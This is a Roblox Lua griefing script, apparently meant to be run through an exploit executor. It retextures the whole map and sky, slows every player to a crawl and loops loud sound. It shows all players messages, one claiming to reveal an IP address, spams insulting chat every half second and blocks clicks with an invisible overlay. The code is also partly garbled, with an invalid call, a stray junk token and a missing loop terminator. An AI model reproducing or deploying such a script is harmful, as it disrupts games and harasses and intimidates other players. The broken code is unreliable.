local A="rbxassetid://8595285721"
local B="rbxassetid://103215672097028"
local P=game:GetService("Players")
local W=game:GetService("Workspace")
local L=game:GetService("Lighting")
local S=game:GetService("SoundService")
local R=game:GetService("ReplicatedStorage")
local T=game:GetService("TextChatService")
local LP=P.LocalPlayer("SoundMute")

local function q(o)
    if not o then return end
    if o:IsA("BasePart") then
        o.Material=Enum.Material.Plastic
        o.TopSurface=0 o.BottomSurface=0
        for _,c in ipairs(o:GetChildren())do
            if c:IsA("Decal")or c:IsA("Texture")then c:Destroy()end
        end
        for _,f in ipairs(Enum.NormalId:GetEnumItems())do
            local d=Instance.new("Decal")
            d.Texture=A d.Face=f d.Parent=o
        end
    elseif o:IsA("MeshPart")or o:IsA("UnionOperation")then
        o.Material=Enum.Material.Plastic o.TextureID=A
    elseif o:IsA("SpecialMesh")or o:IsA("BlockMesh")or o:IsA("CylinderMesh")then
        o.TextureId=A
    end
end

local function r(o)pcall(function()q(o)for _,v in ipairs(o:GetChildren())do r(v)end end)end
for _,o in ipairs(W:GetChildren())do r(o) W.DescendantAdded:Connect(r)

local sky=Instance.new("Sky")
for _,f in pairs({"SkyboxBk","SkyboxDn","SkyboxFt","SkyboxLf","SkyboxRt","SkyboxUp"})do sky[f]=A end
sky.Parent=L L.FogColor=Color3.fromRGB(150,0,0)L.FogEnd=500 L.FogStart=0

pcall(function()local s=Instance.new("Sound")s.SoundId=B s.Looped=true s.Volume=30 s.Parent=S s:Play()end)

local function p(pl)
    local c=pl.Character if not c then return end
    local h=c:FindFirstChildOfClass("Humanoid")if h then h.WalkSpeed=1 end
    for _,pa in ipairs(c:GetChildren())do
        if pa:IsA("BasePart")then
            local e=Instance.new("ParticleEmitter")
            e.Texture=A e.Size=NumberSequence.new(1) e.Lifetime=NumberRange.new(2)
            e.Rate=5 e.Speed=NumberRange.new(0) e.Shape=Enum.ParticleEmitterShape.Box e.Parent=pa
        end
    end
end

for _,pl in ipairs(P:GetPlayers())do p(pl)end
P.PlayerAdded:Connect(function(pl)pl.CharacterAdded:Connect(p)end)
for _,pl in ipairs(P:GetPlayers())do if pl.Character then p(pl)end end

local function g(t)
    for _,pl in ipairs(P:GetPlayers())do
        local G=Instance.new("ScreenGui")G.ResetOnSpawn=false G.Parent=pl:WaitForChild("PlayerGui")
        local l=Instance.new("TextLabel")l.Size=UDim2.new(.8,0,.08,0)l.Position=UDim2.new(.1,0,.05,0)
        l.BackgroundTransparency=.5 l.BackgroundColor3=Color3.new()l.TextColor3=Color3.new(1,1,1)
        l.Font=Enum.Font.ArialBold l.TextScaled=true l.TextStrokeTransparency=0 l.TextStrokeColor3=Color3.new()
        l.Text=t l.Parent=G
    end
end

local M={"just dont use this anymore","your ip is 27.138.92.183","i hate scripters"}
for i,m in ipairs(M)do task.delay(i*5,function()g(m)end)end

local function c(t,d)
    task.delay(d,function()
        local G=Instance.new("ScreenGui")G.ResetOnSpawn=false G.Parent=LP:WaitForChild("PlayerGui")
        local l=Instance.new("TextLabel")l.Size=UDim2.new(.5,0,.06,0)l.Position=UDim2.new(.25,0,.85,0)
        l.BackgroundTransparency=.3 l.BackgroundColor3=Color3.new()l.TextColor3=Color3.new(1,1,1)
        l.Font=Enum.Font.ArialBold l.TextScaled=true l.Text=t l.Parent=G
    end)
end

local C={"you're ready?","yes","maybe"}for i,m in ipairs(C)do c(m,i*5)end

local msg="hi, i'm script, and i'm a loser"
spawn(function()while true do
    local s,e=pcall(function()
        local sent=false
        pcall(function()
            if T and T.ChatVersion==Enum.ChatVersion.TextChatService then
                local ch=T:FindFirstChild("TextChannels")local g=ch and ch:FindFirstChild("RBXGeneral")
                if g and g.SendAsync then g:SendAsync(msg)sent=true end
            end
        end)
        if not sent then
            local d=R:FindFirstChild("DefaultChatSystemChatEvents")
            if d and d:FindFirstChild("SayMessageRequest")then d.SayMessageRequest:FireServer(msg,"All")end
        end
    end)if not s then warn("msg fail",e)end task.wait(.5)
end end)

do
    local G=Instance.new("ScreenGui")G.ResetOnSpawn=false G.Parent=LP:WaitForChild("PlayerGui")
    local b=Instance.new("TextButton")b.Size=UDim2.new(0,60,0,60)b.Position=UDim2.new(1,-65,0,5)
    b.BackgroundTransparency=1 b.Text=""b.AutoButtonColor=false b.Selectable=false b.Active=true b.Parent=G
    b.MouseButton1Click:Connect(function()print("Clique bloqueado")end)<a>=quidonocu
    b.InputBegan:Connect(function(i)if i.UserInputType==Enum.UserInputType.Touch then print("Toque bloqueado")end end)
end